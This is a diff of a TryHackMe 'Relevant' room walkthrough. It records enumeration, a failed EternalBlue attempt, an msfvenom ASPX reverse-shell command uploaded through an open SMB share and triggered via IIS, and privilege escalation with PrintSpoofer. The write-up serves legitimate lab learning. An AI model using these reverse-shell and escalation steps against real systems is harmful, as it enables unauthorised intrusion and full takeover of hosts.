@@ -10,7 +10,11 @@ THM Relevant Room Walkthrough: https://tryhackme.com/room/relevant
 - port 49663 open --> subdomain /nt4wrksv accessible
 - smb allows for upload and download of files (get/put) --> can upload a reverse shell and then access through browser
 - catch reverse shell --> user flag
-- 
+- find user flag
+- check whoami & whoami /priv --> SeImpersonatePrivilege enabled is a major security concern
+- use JuicyPotato or PrintSpoofer to escalate
+- Upload [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) and run as instructed
+- whoami --> 
 ## Walkthrough
 ---
 Let's first begin by enumerating the machine with nmap. We will run nmap with
@@ -72,13 +76,13 @@ At this point I was feeling a bit stuck. Let's maybe try to enum the subdirector
 
 Running Gobuster gives us nothing interesting in terms of directories and takes very long. I used directory-list-2.3-medium.txt
 
-At this point, the machine became unresponsive which was common in this lab and I had to restart it. I ran MS17-010 SMB RCE Detection to see if maybe the system is vulnerable to EternalBlue. The result told me that the host is likely vulnerable to it, so I tried running EternalBlue.
+The machine became unresponsive which was common in this lab and I had to restart it. I ran MS17-010 SMB RCE Detection to see if maybe the system is vulnerable to EternalBlue. The result told me that the host is likely vulnerable to it, so I tried running EternalBlue.
 
 ![](attachments/Pasted%20image%2020250201172528.png)
 
-Running EternalBlue did not actually work and it once again froze the system. 
+It did not work and again froze the system. 
 
-Once again, feeling stuck the only thing I can think of is to nmap all the ports instead of just the 1000 most popular ports. This also takes very long.
+The only thing I can think of is to nmap all the ports instead of just the 1000 most popular ports. This also takes very long.
 
 ![](attachments/Pasted%20image%2020250201174152.png)
 
@@ -90,15 +94,15 @@ Weird. It takes us to the same page. Let's just try to check the other ports as 
 
 As expected the other 2 ports don't resolve.
 
-The image takes us to the same link as the last image and other than the port, it looks identical to the page on port 80. Let's maybe try to enumerate subdirectories of this domain with the new port.
+The image takes us to the same link as the last image and other than the port, it looks identical to the page on port 80. Let's try to enumerate subdirectories with the new port.
 
-This took extremely long. I think there is something wrong with the box. It freezes extremely easily and only responds when rebooted. Good news is we found a subdirectory that is the same as our SMB share /nt4wrksv. When we visit it we get an empty page. I would normally enumerate this subdirectory again but since this is the same name as our SMB share maybe it's accessing the same directory. Let's see if we can access the passwords.txt file from browser. We can! This means if we can upload files we should also be able to access them through here, which means we can possibly get a rev shell. Let's generate and upload a rev shell.
+This box is extremely slow and freezes often, requiring reboots. I found a subdirectory matching the SMB share (/nt4wrksv) that loads an empty page. Since it may access the same directory, I checked for passwords.txt via the browser—and it worked. If I can upload files, I might get a reverse shell. Time to generate and upload one.
 
 ```bash
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.21.101.68 LPORT=4444 -f aspx -o rev.aspx
 ```
 
-Generated a rev shell with MSFVenom. We know it's a windows server using IIS, we should maybe be able to use aspx, asp, or php. Let's try aspx first. Uploading this with the smbclient and accessing this through the web server. Also setting up an nc listener on port 444.
+Generated a rev shell with MSFVenom. We know it's a windows server using IIS, we should maybe be able to use aspx, asp, or php.Uploading this with the smbclient and accessing this through the web server. Setting up an nc listener on port 444.
 
 ```bash
 smbclient //10.10.219.157/nt4wrksv
@@ -115,3 +119,17 @@ Accessing the webserver with the rev shell takes a second, but we are in!
  Navigating to the Users directory and then Bob>Desktop gives us our first flag!
 
 ![](attachments/Pasted%20image%2020250201195710.png)
+
+Checking whoami and whoami /priv we get 
+
+![](attachments/Pasted%20image%2020250201202051.png)
+
+The SeImpersonatePrivilege Priv being enabled is a major issue based on my research. We can use something like JuicyPotato or PrintSpoofer to escalate. Let's try Printspoofer since we can easily upload files with SMB.
+
+![](attachments/Pasted%20image%2020250201203400.png)
+
+Priv has been escalted. Found the root flag in C:\Users\Administrator\Desktop\root.txt
+
+![](attachments/Pasted%20image%2020250201203643.png)
+
+
